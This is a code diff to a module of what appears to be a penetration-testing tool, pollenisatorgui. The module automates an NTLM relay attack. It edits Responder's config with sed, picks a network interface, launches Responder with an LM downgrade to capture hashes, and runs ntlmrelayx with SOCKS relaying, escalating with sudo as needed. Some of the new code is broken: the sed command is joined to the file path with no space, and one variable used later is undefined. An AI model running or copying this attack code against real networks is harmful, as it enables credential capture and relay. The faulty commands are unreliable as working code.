@@ -1,4 +1,7 @@
 import multiprocessing
+
+import psutil
+from pollenisatorgui.core.components.logger_config import logger
 import pollenisatorgui.core.components.utils as utils
 from pollenisatorgui.core.application.dialogs.ChildDialogQuestion import ChildDialogQuestion
 from pollenisatorgui.core.application.dialogs.ChildDialogCombo import ChildDialogCombo
@@ -35,12 +38,20 @@ def main(apiclient, appli, **kwargs):
     responder_conf = ""
     if utils.which_expand_alias("locate"):
         output = multiprocessing.Queue()
-        res_code = utils.execute("locate Responder.conf", None, queueResponse=output)
-        stdout = "" if output.empty() else output.get()
+        res_code = utils.execute_no_fork("locate Responder.conf", None, queueResponse=output, printStdout=False)
+        stdout = "" 
+        while not output.empty():
+            output_line = output.get()
+            if isinstance(output_line, bytes):
+                output_line = output_line.decode("utf-8")
+            stdout += output_line
+        output.close()
         if stdout is None or stdout.strip() == "":
-            file = tk.filedialog.askopenfilename(" Locate responder conf file please",filetypes=[('Config Files', '*.conf')])
+            file = tk.filedialog.askopenfilename(title="Locate responder conf file please",filetypes=[('Config Files', '*.conf')])
             if file:
                 responder_conf = file
+            else:
+                return False, "Responder conf not given"
         else:
             dialog = ChildDialogCombo(None, stdout.split("\n"), displayMsg="Choose your responder config file", width=200)
             dialog.app.wait_window(dialog.app)
@@ -48,18 +59,17 @@ def main(apiclient, appli, **kwargs):
                 responder_conf = dialog.rvalue.strip()
                 if os.geteuid() != 0:
                     cmd = "sudo "+cmd
-                cmd = f"sed -i -E 's/(HTTP|SMB) = On/\1 = Off/gm' {responder_conf}"
-                appli.launch_in_terminal(kwargs.get("default_target",None), "sed for responder", cmd, use_pollex=False)
-                cmd = f"responder -I {dialog.rvalue} -dvw --lm --disable-ess"
-                if os.geteuid() != 0:
-                    cmd = "sudo "+cmd
-                appli.launch_in_terminal(kwargs.get("default_target",None), "responder", cmd, use_pollex=False)
-    cmd = ""
-    if dialog.rvalue == "Yes":
-        cmd = 'sed -i -E "s/(socks[4-5]\s+127.0.0.1\s+)[0-9]+/\\11080/gm" /etc/proxychains.conf'
-        if os.geteuid() != 0:
-            cmd = "sudo "+cmd
-        appli.launch_in_terminal(kwargs.get("default_target",None), "sed proxychains", cmd, use_pollex=False)
+                cmd = "sed -i -E 's/(HTTP|SMB) = On/\1 = Off/gm'"+str(responder_conf)
+                appli.launch_in_terminal(None, "sed for responder", cmd, use_pollex=False)
+    addrs = psutil.net_if_addrs()
+    dialog = ChildDialogCombo(None, addrs.keys(), displayMsg="Choose your ethernet device to listen on")
+    dialog.app.wait_window(dialog.app)
+    if dialog.rvalue is None:
+        return False, "No ethernet device chosen"
+    cmd = f"responder -I {dialog.rvalue} -dvw --lm --disable-ess"
+    if os.geteuid() != 0:
+        cmd = "sudo "+cmd
+    appli.launch_in_terminal(None, "responder", cmd, use_pollex=False)
 
     cmd = f"ntlmrelayx -tf {file_name} -smb2support -socks -l {relaying_loot_path}"
     if os.geteuid() != 0:
